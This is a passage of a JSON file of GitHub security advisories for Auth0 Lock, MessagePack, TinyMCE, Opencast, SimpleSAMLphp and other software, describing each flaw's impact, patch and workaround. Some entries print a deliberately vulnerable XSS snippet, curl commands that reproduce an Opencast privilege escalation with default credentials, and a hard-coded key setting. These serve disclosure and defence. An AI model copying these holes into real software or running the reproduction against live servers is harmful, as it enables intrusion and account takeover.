upgrading?_\n\nNo workaround are available\n\n### References\n\n - [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)\n - GitHub Issue https://github.com/checkstyle/checkstyle/issues/7468\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/checkstyle/checkstyle/issues",
    "summary": "XML external entity (XXE) processing ('external-parameter-entities' feature was not fully disabled))"
  },
  {
    "ghsaId": "GHSA-w2pf-g6r8-pg22",
    "publishedAt": "2020-01-31T17:59:51Z",
    "description": "## Overview\n\nAuth0 Lock version 11.20.4 and earlier did not properly sanitize the generated HTML code. Customers using the `additionalSignUpFields` customization option to add a checkbox to the sign-up dialog that are passing a `placeholder` property obtained from an untrusted source (e.g. a query parameter) could allow cross-site scripting (XSS) on their signup pages.\n\n## Am I affected?\n\nYou are affected by this vulnerability if all of the following conditions apply:\n\n- You are using Auth0 Lock version 11.20.4 or earlier.\n- You pass `additionalSignUpFields` as options when initializing Lock which includes a field of type `checkbox` whose `placeholder` value is obtained from an untrusted source.\n\nAn example of a vulnerable snippet is the following where the `placeholder` value is partially user-controlled by the `name` query parameter:\n\n```javascript\n<script>\n    var params = new URLSearchParams(window.location.search);\n    var options = {\n        auth: {\n            redirectUrl: 'http://localhost:12345/callback',\n            responseType: 'code',\n            params: {\n                scope: 'openid email',\n            },\n        },\n        additionalSignUpFields: [{\n            name: 'agree',\n            type: 'checkbox',\n            placeholder: \"I agree to Terms and Conditions for \" + params.get('name'),\n        }],\n    };\n    var lock = new Auth0Lock('<CLIENT_ID>', '<TENANT_NAME>.auth0.com', options);\n    lock.show({\n        allowShowPassword: true,\n        initialScreen: 'signUp',\n    });\n</script>\n```\n\n## How to fix that?\n\nDevelopers using Auth0’s signin solution Lock need to upgrade to version 11.21.0 or later. Version 11.21.0 introduces two changes:\n\n1. The existing `placeholder` property is now treated as plain text to mitigate the problem.\n2. A new `placeholderHTML` property is introduced that indicates the level of control it provides and that it should be only supplied from trusted sources.\n\n## Will this update impact my users?\n\nThis fix patches the Auth0 Lock widget and may require changes in application code, but it will not impact your users, their current state, or any existing sessions.\n\nDevelopers using the `placeholder` property with HTML content from a trusted source should start using the `placeholderHTML` property to continue providing the same user experience.",
    "summary": "Placeholder property does not indicate HTML capable, could lead to inadvertent abuse"
  },
  {
    "ghsaId": "GHSA-7q36-4xx7-xcxf",
    "publishedAt": "2020-01-31T17:59:20Z",
    "description": "### Impact\n\nWhen this library is used to deserialize messagepack data from an untrusted source, there is a risk of a denial of service attack by either of two vectors:\n\n1. hash collisions - leading to large CPU consumption disproportionate to the size of the data being deserialized.\n1. stack overflow - leading to the deserializing process crashing.\n\n### Patches\n\nThe following steps are required to mitigate this risk.\n\n1. Upgrade to a version of the library where a fix is available\n1. Add code to your application to put MessagePack into the defensive `UntrustedData` mode.\n1. Identify all MessagePack extensions that implement `IMessagePackFormatter&lt;T&gt;` implementations that do not ship with the MessagePack library to include the security mitigations. This includes those acquired from 3rd party packages and classes included directly into your project. Any AOT formatters generated with the MPC tool must be regenerated with the patched version of mpc.\n1. Review your messagepack-serializable data structures for hash-based collections that use custom or unusual types for the hashed key. See below for details on handling such situations.\n\nReview the `MessagePackSecurity` class to tweak any settings as necessary to strike the right balance between performance, functionality, and security.\n\nSpecialized `IEqualityComparer&lt;T&gt;` implementations provide the hash collision resistance.\nEach type of hashed key may require a specialized implementation of its own.\nThe patched MessagePack library includes many such implementations for primitive types commonly used as keys in hash-based collections.\nIf your data structures use custom types as keys in these hash-based collections,\nputting MessagePack in `UntrustedData` mode may lead the deserializer to throw an exception\nbecause no safe `IEqualityComparer&lt;T&gt;` is available for your custom `T` type.\nYou can provide your own safe implementation by deriving from the `MessagePackSecurity` class\nand overriding the `GetHashCollisionResistantEqualityComparer&lt;T&gt;()` method to return your own\ncustom implementation when `T` matches your type, and fallback to `return base.GetHashCollisionResistantEqualityComparer&lt;T&gt;();` for types you do not have custom implementations for.\n\nUnrelated to this advisory, but as general security guidance, you should also avoid the Typeless serializer/formatters/resolvers for untrusted data as that opens the door for the untrusted data to potentially deserialize unanticipated types that can compromise security.\n\n#### MessagePack 1.x users\n\n1. Upgrade to any 1.9.x version.\n\n1. When deserializing untrusted data, put MessagePack into a more secure mode with:\n\n    ```cs\n    MessagePackSecurity.Active = MessagePackSecurity.UntrustedData;\n    ```\n\n    In MessagePack v1.x this is a static property and thus the security level is shared by the entire process or AppDomain.\n    Use MessagePack v2.1 or later for better control over the security level for your particular use.\n\n1. Any code produced by mpc should be regenerated with the mpc tool with the matching (patched) version. Such generated code usually is written to a file called `Generated.cs`. A patched `Generated.cs` file will typically reference the `MessagePackSecurity` class.\n\n    Review any custom-written `IMessagePackFormatter&lt;T&gt;` implementations in your project or that you might use from 3rd party packages to ensure they also utilize the `MessagePackSecurity` class as required.\n    In particular, a formatter that deserializes an object (as opposed to a primitive value) should wrap the deserialization in a `using (MessagePackSecurity.DepthStep())` block. For example:\n\n    ```cs\n    public MyObject Deserialize(ref MessagePackReader reader, MessagePackSerializerOptions options)\n    {\n        if (reader.TryReadNil())\n        {\n            return default;\n        }\n        else\n        {\n            using (MessagePackSecurity.DepthStep()) // STACK OVERFLOW MITIGATION\n            {\n                MyObject o = new MyObject();\n                // deserialize members of the object here.\n                return o;\n            }\n        }\n    }\n    ```\n\n    If your custom formatter creates hash-based collections (e.g. `Dictionary&lt;K, V&gt;` or `HashSet&lt;T&gt;`) where the hashed key comes from the messagepack data, always instantiate your collection using `MessagePackSecurity.Active.GetEqualityComparer&lt;T&gt;()` as the equality comparer:\n\n    ```cs\n    var collection = new HashSet&lt;T&gt;(MessagePackSecurity.Active.GetEqualityComparer&lt;T&gt;());\n    ```\n\n    This ensures that when reading untrusted data, you will be using a collision-resistent hash algorithm.\n\nLearn more about [best security practices when reading untrusted data with MessagePack 1.x](https://github.com/neuecc/MessagePack-CSharp/tree/v1.x#security).\n\n#### MessagePack 2.x users\n\n1. Upgrade to any 2.1.x or later version.\n\n1. When deserializing untrusted data, put MessagePack into a more secure mode by configuring your `MessagePackSerializerOptions.Security` property:\n\n    ```cs\n    var options = MessagePackSerializerOptions.Standard\n        .WithSecurity(MessagePackSecurity.UntrustedData);\n\n    // Pass the options explicitly for the greatest control.\n    T object = MessagePackSerializer.Deserialize&lt;T&gt;(data, options);\n\n    // Or set the security level as the default.\n    MessagePackSerializer.DefaultOptions = options;\n    ```\n\n1. Any code produced by mpc should be regenerated with the mpc tool with the matching (patched) version. Such generated code usually is written to a file called `Generated.cs`. A patched `Generated.cs` file will typically reference the `Security` member on the `MessagePackSerializerOptions` parameter.\n\n    Review any custom-written `IMessagePackFormatter&lt;T&gt;` implementations in your project or that you might use from 3rd party packages to ensure they also utilize the `MessagePackSecurity` class as required.\n    In particular, a formatter that deserializes an object (as opposed to a primitive value) should call `options.Security.DepthStep(ref reader);` before deserializing the object&#39;s members, and be sure to revert the depth step with `reader.Depth--;` before exiting the method. For example:\n\n    ```cs\n    public MyObject Deserialize(ref MessagePackReader reader, MessagePackSerializerOptions options)\n    {\n        if (reader.TryReadNil())\n        {\n            return default;\n        }\n        else\n        {\n            options.Security.DepthStep(ref reader); // STACK OVERFLOW MITIGATION, line 1\n            try\n            {\n                MyObject o = new MyObject();\n                // deserialize members of the object here.\n                return o;\n            }\n            finally\n            {\n                reader.Depth--; // STACK OVERFLOW MITIGATION, line 2\n            }\n        }\n    }\n    ```\n\n    If your custom formatter creates hash-based collections (e.g. `Dictionary&lt;K, V&gt;` or `HashSet&lt;T&gt;`) where the hashed key comes from the messagepack data, always instantiate your collection using `options.Security.GetEqualityComparer&lt;TKey&gt;()` as the equality comparer:\n\n    ```cs\n    var collection = new HashSet&lt;T&gt;(options.Security.GetEqualityComparer&lt;T&gt;());\n    ```\n\n    This ensures that when reading untrusted data, you will be using a collision-resistent hash algorithm.\n\nLearn more about [best security practices when reading untrusted data with MessagePack 2.x](https://github.com/neuecc/MessagePack-CSharp#security).\n\n### Workarounds\n\nThe security vulnerabilities are in the formatters.\nAvoiding the built-in formatters entirely in favor of reading messagepack primitive data directly\nor relying on carefully written custom formatters can provide a workaround.\n\nMessagePack v1.x users may utilize the `MessagePackBinary` static class directly to read the data they expect.\nMessagePack v2.x users may utilize the `MessagePackReader` struct directly to read the data they expect.\n\n### References\n\nLearn more about best security practices when reading untrusted data with [MessagePack 1.x](https://github.com/neuecc/MessagePack-CSharp/tree/v1.x#security) or [MessagePack 2.x](https://github.com/neuecc/MessagePack-CSharp#security).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [MessagePack-CSharp](https://github.com/neuecc/MessagePack-CSharp/issues/new/choose)\n* [Email us](mailto:andrewarnott@gmail.com)",
    "summary": "Untrusted data can lead to DoS attack due to hash collisions and stack overflow in MessagePack"
  },
  {
    "ghsaId": "GHSA-8f9f-pc5v-9r5h",
    "publishedAt": "2020-01-30T23:55:04Z",
    "description": "### Impact\nA user who owns an ENS domain can set a \"trapdoor\", allowing them to transfer ownership to another user, and later regain ownership without the new owner's consent or awareness.\n\n### Patches\n\nA new ENS deployment is being rolled out that fixes this vulnerability in the ENS registry. The registry is newly deployed at [0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e](https://etherscan.io/address/0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e).\n\n### Workarounds\nDo not accept transfers of ENS domains from other users on the old registrar.",
    "summary": "Malicious takeover of previously owned ENS names"
  },
  {
    "ghsaId": "GHSA-27gm-ghr9-4v95",
    "publishedAt": "2020-01-30T21:22:15Z",
    "description": "### Impact\nA cross-site scripting (XSS) vulnerability was discovered in: the core parser, `paste` and `visualchars` plugins. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor via the clipboard or APIs. This impacts all users who are using TinyMCE 4.9.6 or lower and TinyMCE 5.1.3 or lower.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 4.9.7 and 5.1.4 by improved parser logic and HTML sanitization.\n\n### Workarounds\nThe workarounds available are:\n- disable the impacted plugins\n- manually sanitize the content using the `BeforeSetContent` event (see below)\n- upgrade to either TinyMCE 4.9.7 or TinyMCE 5.1.4\n\n#### Example: Manually sanitize content\n```js\neditor.on('BeforeSetContent', function(e) {\n  var sanitizedContent = ...; // Manually sanitize content here\n  e.content = sanitizedContent;\n});\n```\n\n### Acknowledgements\nTiny Technologies would like to thank Michał Bentkowski for discovering this vulnerability.\n\n### References\nhttps://www.tiny.cloud/docs/release-notes/release-notes514/#securityfixes\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)\n* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",
    "summary": "Cross-site scripting vulnerability in TinyMCE"
  },
  {
    "ghsaId": "GHSA-6f54-3qr9-pjgj",
    "publishedAt": "2020-01-30T21:22:06Z",
    "description": "### Impact\n\nMedia publication via OAI-PMH allows unauthenticated public access to all media and metadata by default. OAI-PMH is part of the default workflow and is activated by default, requiring active user intervention of users to protect media. This leads to users unknowingly handing out public access to events without their knowledge.\n\n\n### Patches\n\nThe problem has been addressed in Opencast 7.6 and 8.1 where the OAI-PMH endpoint is configured to require users with `ROLE_ADMIN` by default. In addition to this, Opencast 9 removes the OAI-PMH publication from the default workflow, making the publication a conscious decision users have to make by updating their workflows.\n\n### Workarounds\n\nIn the organization security configuration (`etc/security/mh_default_org.xml`), change the roles required for accessing `/oaipmh` from `ROLE_ANONYMOUS` to `ROLE_ADMIN`.\n\n### References\n\n- [Public access configuration in the organization's security configuration](https://github.com/opencast/opencast/blob/1fb812c7810c78f09f29a7f455ff920417924307/etc/security/mh_default_org.xml#L271-L276)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
    "summary": "Unauthenticated Access Via OAI-PMH"
  },
  {
    "ghsaId": "GHSA-h362-m8f2-5x7c",
    "publishedAt": "2020-01-30T21:21:58Z",
    "description": "### Impact\n\nUser passwords are stored in the database using the rather outdated and cryptographically insecure MD5 hash algorithm. Furthermore, the hashes are salted using the username instead of a random salt, causing hashes for users with the same username and password to collide which is problematic especially for popular users like the default `admin` user.\n\nThis essentially means that for an attacker, it might be feasible to reconstruct a user's password given access to these hashes.\n\nNote that attackers needing access to the hashes means that they must gain access to the database in which these are stored first to be able to start cracking the passwords.\n\n\n### Patches\n\nThe problem is addressed in Opencast 8.1 which now uses the modern and much stronger bcrypt password hashing algorithm for storing passwords. Note, that old hashes remain MD5 until the password is updated.\n\nFor a list of users whose password hashes are stored using MD5, take a look at the `/user-utils/users/md5.json` REST endpoint.\n\n\n### Workarounds\n\nThere is no workaround.\n\n### References\n\n- [MD5 (Wikipedia)](https://en.wikipedia.org/wiki/MD5)\n- [bcrypt (Wikipedia)](https://en.wikipedia.org/wiki/Bcrypt)\n- [How weak is MD5 as a password hashing function?](https://security.stackexchange.com/q/52461)\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
    "summary": "Password Hashing: Do not use MD5"
  },
  {
    "ghsaId": "GHSA-w29m-fjp4-qhmq",
    "publishedAt": "2020-01-30T21:21:50Z",
    "description": "### Impact\n\nOpencast allows almost arbitrary identifiers for media packages and\nelements to be used. This can be problematic for operation and security\nsince such identifiers are sometimes used for file system operations\nwhich may lead to an attacker being able to escape working directories and\nwrite files to other locations.\n\nIn addition, Opencast's Id.toString(…) vs Id.compact(…) behavior,\nthe latter trying to mitigate some of the file system problems, can\ncause errors due to identifier mismatch since an identifier may\nunintentionally change.\n\n### Patches\n\nThis issue is fixed in Opencast 7.6 and 8.1.\n\n### Workarounds\n\nThere is no workaround for this.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
    "summary": "Unsafe Identifiers in Opencast"
  },
  {
    "ghsaId": "GHSA-mh8g-hprg-8363",
    "publishedAt": "2020-01-30T21:21:44Z",
    "description": "### Impact\n\nThe security configuration in `etc/security/mh_default_org.xml` enables a remember-me cookie based on a hash created from the [username, password, and an additional system key](https://docs.spring.io/spring-security/site/docs/3.0.x/reference/remember-me.html). Opencast has hard-coded this system key in the large XML file and never mentions to change this, basically ensuring that all systems use the same key:\n\n```xml\n<sec:remember-me key=\"opencast\" user-service-ref=\"userDetailsService\" />\n```\n\nThis means that an attacker getting access to a remember-me token for one server can get access to all servers which allow log-in using the same credentials without ever needing the credentials. For example, a remember-me token obtained from develop.opencast.org can be used on stable.opencast.org without actually knowing the log-in credentials.\n\nSuch an attack will usually not work on different installations – assuming that safe, unique passwords are used – but it is basically guaranteed to work to get access to all machines of one cluster if a token from one machine is compromised.\n\n### Patches\n\nThis problem is fixed in Opencast 7.6 and Opencast 8.1\n\n### Workarounds\n\nWe strongly recommend updating to the patched version. Still, as a workaround for older versions, in `etc/security/mh_default_org.xml`, set a custom key for each server:\n\n```xml\n<sec:remember-me key=\"CUSTOM_RANDOM_KEY\" user-service-ref=\"userDetailsService\" />\n```\n\n### References\n\n- [Relevant lines in the security configuration](https://github.com/opencast/opencast/blob/161ee619382f144dc35eea211fc6b556025b98e1/etc/security/mh_default_org.xml#L335-L336)\n- [Spring Security Remember-Me Authentication Documentation](https://docs.spring.io/spring-security/site/docs/3.0.x/reference/remember-me.html#remember-me-hash-token)\n\n### For more information\nIf you have any questions or comments about this advisory:\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at [security@opencast.org](mailto:security@opencast.org)\n\n### Thanks\nThanks to @LukasKalbertodt for reporting the issue.",
    "summary": "Hard-Coded Key Used For Remember-me Token in OpenCast"
  },
  {
    "ghsaId": "GHSA-94qw-r73x-j7hg",
    "publishedAt": "2020-01-30T21:21:37Z",
    "description": "### Impact\n\nUsers with the role `ROLE_COURSE_ADMIN` can use the user-utils endpoint to create new users not including the role `ROLE_ADMIN`. For example:\n\n```bash\n# Use the admin to create a new user with ROLE_COURSE_ADMIN using the admin user.\n# We expect this to work.\n% curl -i -u admin:opencast 'https://example.opencast.org/user-utils/xy.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP/2 201\n\n# Use the new user to create more new users.\n# We don't expüect a user with just role ROLE_COURSE_ADMIN to succeed.\n# But it does work\n% curl -i -u xy:f 'https://example.opencast.org/user-utils/ab.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP/2 201\n```\n`ROLE_COURSE_ADMIN` is a non-standard role in Opencast which is referenced neither in the documentation nor in any code (except for tests) but only in the security configuration. From the name – implying an admin for a specific course – users would never expect that this role allows user creation.\n\n### Patches\n\nThis issue is fixed in 7.6 and 8.1 which both ship a new default security configuration.\n\n### Workarounds\n\nYou can fix this issue by removing all instances of `ROLE_COURSE_ADMIN` in your organization's security configuration (`etc/security/mh_default_org.xml` by default).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
    "summary": "Users with ROLE_COURSE_ADMIN can create new users in OpenCast"
  },
  {
    "ghsaId": "GHSA-vmm6-w4cf-7f3x",
    "publishedAt": "2020-01-30T21:21:30Z",
    "description": "### Impact\n\nUsing a remember-me cookie with an arbitrary username can cause Opencast to assume proper authentication for that user even if the remember-me cookie was incorrect given that the attacked endpoint also allows anonymous access.\n\nThis way, an attacker can, for example, fake a remember-me token, assume the identity of the global system administrator and request non-public content from the search service without ever providing any proper authentication.\n\n\n### Patches\n\nThis problem is fixed in Opencast 7.6 and Opencast 8.1\n\n\n### Workarounds\n\nAs a workaround for older, unpatched versions, disabling remember-me cookies in `etc/security/mh_default_org.xml` will mitigate the problem but will obviously also disable this feature without obvious indication. To deactivate this, remove the following line from the security configuration:\n\n```xml\n<sec:remember-me … />\n```\n\n### References\n\n- [Remember-me cookie in the security configuration file](https://github.com/opencast/opencast/blob/161ee619382f144dc35eea211fc6b556025b98e1/etc/security/mh_default_org.xml#L335-L336)\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
    "summary": "Authentication Bypass For Endpoints With Anonymous Access in OpenCast"
  },
  {
    "ghsaId": "GHSA-8w65-xjc5-9w79",
    "publishedAt": "2020-01-30T21:00:21Z",
    "description": "A stored XSS vulnerability is present within node-red (version: <= 0.20.7) npm package, which is a visual tool for wiring the Internet of Things. This issue will allow the attacker to steal session cookies, deface web applications, etc.",
    "summary": "Stored XSS vulnerability"
  },
  {
    "ghsaId": "GHSA-g8q7-xv52-hf9f",
    "publishedAt": "2020-01-28T22:37:50Z",
    "description": "### Impact\n\nThe *feedgen* library allows supplying XML as content for some of the available fields. This XML will be parsed and integrated into the existing XML tree. During this process, feedgen is vulnerable to [XML Denial of Service Attacks](https://docs.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses) (e.g. XML Bomb).\n\nThis becomes a concern in particular if feedgen is used to include content from untrused sources and if XML (including XHTML) is directly included instead of providing plain tex content only.\n\n### Patches\n\nThis problem has been fixed in feedgen 0.9.0 which disallows XML entity expansion and external resources.\n\n### Workarounds\n\nUpdating is strongly recommended and should not be problematic. Nevertheless, as a workaround, avoid providing XML directly to feedgen or ensure that no entity expansion is part of the XML. \n\n### References\n\n- [Security Briefs - XML Denial of Service Attacks and Defenses](https://docs.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses)\n- [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack#cite_note-2)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n- Open an issue in [lkiesow/python-feedgen](https://github.com/lkiesow/python-feedgen/issues)\n- Send an email to security@lkiesow.de",
    "summary": "Feedgen Vulnerable to XML Denial of Service Attacks"
  },
  {
    "ghsaId": "GHSA-2289-pqfq-6wx7",
    "publishedAt": "2020-01-28T22:26:54Z",
    "description": "The 8.1.1 and 8.2.0 releases of Apache Solr contain an insecure setting for the ENABLE_REMOTE_JMX_OPTS configuration option in the default solr.in.sh configuration file shipping with Solr. If you use the default solr.in.sh file from the affected releases, then JMX monitoring will be enabled and exposed on RMI_PORT (default=18983), without any authentication. If this port is opened for inbound traffic in your firewall, then anyone with network access to your Solr nodes will be able to access JMX, which may in turn allow them to upload malicious code for execution on the Solr server.",
    "summary": "Unrestricted upload of file with dangerous type in Apache Solr"
  },
  {
    "ghsaId": "GHSA-v384-jqmq-fc74",
    "publishedAt": "2020-01-28T22:26:16Z",
    "description": "htdocs/user/passwordforgotten.php in Dolibarr 10.0.6 allows XSS via the Referer HTTP header.",
    "summary": "XSS in Dolibarr ERP & CRM"
  },
  {
    "ghsaId": "GHSA-977j-xj7q-2jr9",
    "publishedAt": "2020-01-28T21:32:29Z",
    "description": "### Impact\n\nConverting a string (from Python) to a `tf.float16` value results in a segmentation fault in eager mode as the format checks for this use case are only in the graph mode.\n\nThis issue can lead to denial of service in inference/training where a malicious attacker can send a data point which contains a string instead of a `tf.float16` value.\n\nSimilar effects can be obtained by manipulating saved models and checkpoints whereby replacing a scalar `tf.float16` value with a scalar string will trigger this issue due to automatic conversions.\n\nThis can be easily reproduced by `tf.constant(\"hello\", tf.float16)`, if eager execution is enabled.\n\n### Patches\nWe have patched the vulnerability in GitHub commit [5ac1b9](https://github.com/tensorflow/tensorflow/commit/5ac1b9e24ff6afc465756edf845d2e9660bd34bf).\n\nWe are additionally releasing TensorFlow 1.15.1 and 2.0.1 with this vulnerability patched.\n\nTensorFlow 2.1.0 was released after we fixed the issue, thus it is not affected.\n\nWe encourage users to switch to TensorFlow 1.15.1, 2.0.1 or 2.1.0.\n\n### For more information\n\nPlease consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
    "summary": "Segmentation faultin TensorFlow when converting a Python string to `tf.float16`"
  },
  {
    "ghsaId": "GHSA-xrr9-rh8p-433v",
    "publishedAt": "2020-01-27T19:28:40Z",
    "description": "### Impact\nRequest smuggling is possible when running behind a proxy that doesn't handle Content-Length and Transfer-Encoding properly or doesn't handle alone \\n as a headers separator.\n\n### Patches\nhttps://github.com/ktorio/ktor/pull/1547\n\n### Workarounds\nNone except migrating to a better proxy.\n\n### References\nhttps://portswigger.net/web-security/request-smuggling\nhttps://tools.ietf.org/html/rfc7230#section-9.5",
    "summary": "Request smuggling is possible when both chunked TE and content length specified"
  },
  {
    "ghsaId": "GHSA-r2wf-q3x4-hrv9",
    "publishedAt": "2020-01-27T19:28:20Z",
    "description": "Versions of Ratpack from 0.9.10 through 1.7.5 are vulnerable to CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (aka. XSS) in the development error handler. An attacker can utilize this to perform XSS when an exception message contains untrusted data.\n\nAs a simplistic example:\n\nThis vulnerability has been patched in Ratpack version 1.7.6.",
    "summary": "Default development error handler in Ratpack is vulnerable to HTML content injection (XSS)"
  },
  {
    "ghsaId": "GHSA-gp2m-7cfp-h6gf",
    "publishedAt": "2020-01-24T21:28:06Z",
    "description": "### Background\nWhen a SimpleSAMLphp Identity Provider is misconfigured, a bug in the software when trying to build a persistent `NameID` to univocally identify the authenticating subject could cause different users to get the same identifier generated, depending on the attributes available for them right after authentication.\n\nPlease note that even though this is possible thanks to a bug, **an IdP must be misconfigured** to release persistent `NameID`s even if it is not properly configured to generate them based on the specifics of the deployment.\n\n### Description\nPersistent `NameID`s will typically be sent as part of the `Subject` element of a SAML assertion, or as the contents of the `eduPersonTargetedID` attribute. Here is an example of such a `NameID`:\n\n    <NameID Format=“urn:oasis:names:tc:SAML:2.0:nameid-format:persistent“>\n        zbonsm0Yn9Gnw14uQEEPr6AO7d+IvxwCQN3t+o24jYs=\n    </NameID>\n\nSome service providers will use this information to identify a user across sessions because a persistent `NameID` will never change for a given user. This could lead to different users accessing the same account in those service providers.\n\nIn order to be affected by this issue, the following circumstances must concur:\n\n- SimpleSAMLphp acts as an identity provider.\n- The service provider asking for authentication requests a persistent `NameID`.\n- No `saml:PersistentNameID` authentication processing filter is configured (neither for the whole IdP, nor for a given SP).\n- No `simplesaml.nameidattribute` configuration option is set (neither for the whole IdP, nor for a given SP).\n- One of the following alternatives:\n  - No `userid.attribute` configuration option is set **and** the users don't have an `eduPersonPrincipalName` attribute in the users backend, **or**\n  - the `userid.attribute` configuration option is set to an empty or missing attribute.\n\nIf all these requirements are met, the `SimpleSAML_Auth_ProcessingChain` class will try to keep a unique user identifier in the state array (`addUserID()` method). Bear in mind that this code is executed **before** all the authentication processing filters configured, meaning that only those attributes retrieved for the user during **initial authentication** will be available. If no `userid.attribute` configuration option is set, the default `eduPersonPrincipalName` will then be used. However, since it is missing, no identifier will be kept. Alternatively, if `userid.attribute` is set to a missing or empty attribute, the `addUserID()` method will abort trying to register an identifier.\n\nAfter executing all authentication processing filters, SimpleSAMLphp will build a SAML assertion. If the service provider requests persistent `NameID`s, SimpleSAMLphp will attempt to generate one given that none is already available (because the `saml:PersistentNameID` filter was not used). At this point, the code will look for the `simplesaml.nameidattribute` configuration option in either the local IdP metadata or in the remote SP metadata. If none of them are configured, it will default to the unique user identifier previously registered by `SimpleSAML_Auth_ProcessingChain`. If no identifier was kept there, the code will log an error message:\n\n    Unable to generate NameID. Check the userid.attribute option.\n\nHowever, instead of aborting the `NameID` generation at that point, it will go on and use a value missing from the state array as the source for the computation, meaning the `null` type will be used. Hence, all users connecting to a given service provider will get the same `NameID` generated, because all the input parameters will be the same:\n\n- The SP's entity identifier.\n- The IdP's entity identifier.\n- The `null` value.\n- The common secret salt from the main configuration.\n\n### Affected versions\nAll SimpleSAMLphp versions between 1.7.0 and 1.14.10, inclusive.\n\n### Impact\nThose identity providers affected by this bug and misconfigured as previously described could be issuing SAML assertions with common `NameID`s for all or a subset of their users. If a service provider uses those `NameID`s to identify the users of the affected IdP, all the users will be associated with the same user account at the service provider, causing all sorts of potential security issues like information disclosure or unauthorized access.\n\nWhile we can consider this unlikely to happen, some cases have been already observed. In particular, some identity providers using default configurations and consuming metadata automatically (i.e. using the _metarefresh_ module) while using a user backend like _Active Directory_ that does not populate `eduPersonPrincipalName` are particularly sensitive to this issue.\n\n### Resolution\nUpgrade to the latest version.\n\nConfigure a `saml:PersistentNameID` authentication processing filter according to your needs. Remember to check that **the attribute used as the source** for the `NameID` **is present at the moment the `saml:PersistentNameID` filter is executed**. The attribute used must be **unique** per user, and **must not change** over time.",
    "summary": "Incorrect persistent NameID generation in SimpleSAMLphp"
  },
  {
    "ghsaId": "GHSA-p9cm-r7jg-8q3g",
    "publishedAt": "2020-01-24T21:27:42Z",
    "description": "### Background\nAn incorrect check of return values in the signature validation utilities allows an attacker to get invalid signatures accepted as valid by forcing an error during validation.\n\n### Description\nThe `SimpleSAML_XML_Validator` class allows the verification of the XML digital signature of a SAML 1 message with a given key. In particular, the constructor of the class receives an XML node and a key to verify it and throws an exception in case there is an error, either caused by incorrect input or an invalid signature. This method uses the `verify()` method from the `RobRichards\\XMLSecDSig` class to verify the signature with the given key, which in turn will end up calling `openssl_verify()` depending on the signature algorithm used.\n\nThe `openssl_verify()` function returns `1` when the signature was successfully verified, `0` if it failed to verify with the given key and `-1` in case an error occurs. PHP allows translating numerical values to boolean implicitly, with the following correspondences:\n\n- `0` equals `false`\n- Non-zero equals `true`\n\nThis means that an implicit conversion to _boolean_ of the values returned by `openssl_verify()` will convert an error state, signaled by the value `-1`, to successful verification of the signature (represented by the _boolean_ `true`).\n\nThe aforementioned constructor was performing an implicit conversion to boolean of the values returned by the `verify()` method, which subsequently will return the same output as `openssl_verify()` under most circumstances. This means an error during signature verification is treated as a successful verification by the method.\n\n###  Affected versions\nAll SimpleSAMLphp versions prior to **1.14.11**.\n\n###  Impact\nUpon successful exploitation, an invalid signature would be regarded as valid by an affected version of the software. This allows attackers to modify or manually craft **SAML 1 response messages** and, by triggering a signature validation error in the affected party, get those messages accepted as valid and coming from a trusted entity. In practice, this means full capabilities to impersonate any individual at a given service provider.\n\nThe issue can be exploited to get other invalid messages accepted as valid, though the security implications there are minor.\n\nIn order to exploit the issue, **SAML 1.1 metadata must be registered by the vulnerable Service Provider for the Identity Provider targeted by the attacker** (in `metadata/shib13-idp-remote.php`), and an incorrect context must be fed to the signature validation routines, or an exceptional error must be triggered. So far, the following cases have been identified:\n\n- Using a DSA public key to validate an XML signature made with an RSA-related algorithm.\n- Using an RSA public key to validate an XML signature made with a DSA-related algorithm.\n- Exhausting available memory while verifying the signature.\n\nSimpleSAMLphp **does not support DSA signatures or keys**. Therefore, it is not possible for an attacker to feed an incorrect context by sending a signature with an incorrect algorithm. Upon reception of a DSA-SHA1 signature, SimpleSAMLphp will refuse to perform the validation due to the algorithm not being supported. On the other hand, if an attacker manages to trick a service provider operator to change the public key associated to a certain IdP to a DSA key, signatures made with any combination of the RSA algorithm will be accepted, regardless of whether they are valid or not. This means some serious misconfiguration or social engineering is needed in this case for a successful attack.\n\nRegarding memory exhaustion, it is in theory possible to attack a service provider causing the consumption of all available memory while a message with an invalid signature is being validated. However, memory exhaustion must happen only during signature validation and not immediately before or after. This means exploitation of this case is extremely difficult due to the small time window available for the attacker and the precise control that is needed over the service provider.\n\nAll in all, the consequences of this issue are critical, so even though we consider it difficult to exploit, and considering that other ways to trigger failures in signature 